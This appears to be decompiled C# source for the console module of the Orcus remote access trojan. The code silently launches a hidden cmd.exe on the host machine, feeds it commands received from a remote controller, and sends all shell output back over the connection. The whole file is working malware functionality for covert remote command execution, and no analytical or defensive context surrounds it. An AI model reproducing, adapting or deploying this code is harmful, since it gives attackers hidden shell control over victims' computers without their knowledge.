using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.Console;
using Orcus.Utilities;

namespace Orcus.Commands.Console;

internal class ConsoleCommand : Command
{
	private Process _cmdProcess;

	private IConnectionInfo _currentConnectionInfo;

	private StreamWriter _standardInput;

	public override void Dispose()
	{
		if (_cmdProcess != null)
		{
			if (!ExceptionUtilities.EatExceptionsNull(() => _cmdProcess.HasExited) == false)
			{
				_cmdProcess.CancelErrorRead();
				_cmdProcess.CancelOutputRead();
				_cmdProcess.Kill();
			}
			_cmdProcess.Dispose();
			_standardInput.Dispose();
			_cmdProcess = null;
		}
	}

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected I4, but got Unknown
		ConsoleCommunication val = (ConsoleCommunication)parameter[0];
		switch ((int)val)
		{
		case 1:
			((Command)this).Dispose();
			_currentConnectionInfo.CommandResponse((Command)(object)this, new byte[1] { 5 }, (PackageCompression)0);
			break;
		case 2:
			if (_cmdProcess != null && !_cmdProcess.HasExited)
			{
				_standardInput.WriteLine(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
			}
			break;
		default:
			throw new ArgumentOutOfRangeException();
		case 0:
		case 6:
		{
			((Command)this).Dispose();
			Encoding encoding = Encoding.GetEncoding(CultureInfo.GetCultureInfo(NativeMethods.GetSystemDefaultLCID()).TextInfo.OEMCodePage);
			_cmdProcess = new Process
			{
				StartInfo = 
				{
					CreateNoWindow = true,
					FileName = "cmd.exe",
					RedirectStandardOutput = true,
					RedirectStandardInput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					StandardErrorEncoding = encoding,
					StandardOutputEncoding = encoding
				}
			};
			if (parameter[0] == 6)
			{
				_cmdProcess.StartInfo.WorkingDirectory = Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1);
			}
			_currentConnectionInfo = connectionInfo;
			_cmdProcess.OutputDataReceived += CmdProcess_OutputDataReceived;
			_cmdProcess.ErrorDataReceived += CmdProcess_OutputDataReceived;
			_cmdProcess.Start();
			_standardInput = new StreamWriter(_cmdProcess.StandardInput.BaseStream, encoding)
			{
				AutoFlush = true
			};
			connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 4 }, (PackageCompression)0);
			_cmdProcess.BeginOutputReadLine();
			_cmdProcess.BeginErrorReadLine();
			break;
		}
		}
	}

	private void CmdProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
	{
		if (e.Data != null)
		{
			List<byte> list = new List<byte> { 3 };
			list.AddRange(Encoding.UTF8.GetBytes(e.Data));
			_currentConnectionInfo.CommandResponse((Command)(object)this, list.ToArray(), (PackageCompression)0);
		}
	}

	protected override uint GetId()
	{
		return 5u;
	}
}
